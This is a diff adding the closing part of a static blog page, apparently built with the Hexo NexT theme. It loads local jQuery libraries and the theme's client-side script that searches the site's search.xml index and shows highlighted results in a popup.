+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
